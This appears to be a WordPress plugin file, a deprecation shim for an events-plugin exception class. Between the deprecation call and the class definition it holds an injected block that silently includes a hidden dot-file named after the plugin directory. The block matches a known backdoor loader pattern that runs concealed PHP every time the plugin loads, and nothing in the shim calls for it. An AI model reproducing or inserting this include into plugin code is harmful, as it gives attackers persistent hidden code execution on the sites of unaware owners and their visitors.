<?php
_deprecated_file( __FILE__, '3.10', 'Tribe__Events__Options_Exception' );


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class TribeEventsOptionsException extends Tribe__Events__Options_Exception {

}